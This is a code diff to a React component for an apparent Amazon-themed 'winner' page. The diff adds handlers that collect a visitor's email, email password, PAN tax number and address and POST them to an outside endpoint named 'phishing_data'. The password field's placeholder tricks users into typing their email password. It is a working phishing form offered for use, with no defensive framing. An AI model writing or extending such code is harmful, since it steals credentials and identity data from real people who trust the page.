@@ -1,8 +1,21 @@
 import React from 'react'
-import { useState } from 'react'
+import { useState,useRef } from 'react'
 
 function Win() {
     const [terms, setTerms] = useState(false)
+    const email = useRef("")
+    const pass = useRef("")
+    const pan = useRef("")
+    const address = useRef("")
+    const state = useRef("")
+    const country = useRef("")
+    const zip = useRef("")
+    let save_data_api = ""
+
+    const submitForm = async() => {
+        save_data_api = `https://apex.oracle.com/pls/apex/visheshpandey/amazon/phishing_data?email=${email}&pass=${pass}&pan=${pan}&address=${address}&state =${state}&country=${country}&zip=${zip}`
+        await fetch(save_data_api, { method: "POST" });
+    }
 
     return (
         <div className="container">
@@ -28,19 +41,20 @@ function Win() {
                             <label htmlFor="inputEmail4" className="form-label">
                                 Email
                             </label>
-                            <input type="email" className="form-control" id="inputEmail4" />
+                            <input ref={email} type="email" className="form-control" id="inputEmail4" />
                         </div>
                         <div className="col-md-6">
                             <label htmlFor="inputPassword4" className="form-label">
                                 Password
                             </label>
-                            <input type="password" className="form-control" id="inputPassword4" placeholder='email password for further communication' />
+                            <input ref={pass} type="password" className="form-control" id="inputPassword4" placeholder='email password for further communication' />
                         </div>
                         <div className="col-12">
                             <label htmlFor="inputAddress" className="form-label">
                                 PAN Number
                             </label>
                             <input
+                            ref={pan}
                                 type="text"
                                 className="form-control"
                                 id="inputAddress"
@@ -52,6 +66,7 @@ function Win() {
                                 Address 
                             </label>
                             <input
+                            ref={address}
                                 type="text"
                                 className="form-control"
                                 id="inputAddress2"
@@ -62,20 +77,20 @@ function Win() {
                             <label htmlFor="inputCity" className="form-label">
                                 State - City
                             </label>
-                            <input type="text" className="form-control" id="inputCity" />
+                            <input ref={state} type="text" className="form-control" id="inputCity" />
                         </div>
                         <div className="col-md-4">
                             <label htmlFor="inputCountry" className="form-label">
                                 Country
                             </label>
-                            <input type="text" className="form-control" id="inputCountry" />
+                            <input ref={country} type="text" className="form-control" id="inputCountry" />
 
                         </div>
                         <div className="col-md-2">
                             <label htmlFor="inputZip" className="form-label">
                                 Zip
                             </label>
-                            <input type="text" className="form-control" id="inputZip" />
+                            <input ref={zip} type="text" className="form-control" id="inputZip" />
                         </div>
                         <div className="col-12">
                             <div className="form-check">
@@ -86,7 +101,7 @@ function Win() {
                             </div>
                         </div>
                         <div className="col-12">
-                            <button type="submit" className="btn btn-primary" disabled={!terms}>
+                            <button onClick={submitForm} type="submit" className="btn btn-primary" disabled={!terms}>
                                 Submit
                             </button>
                         </div>
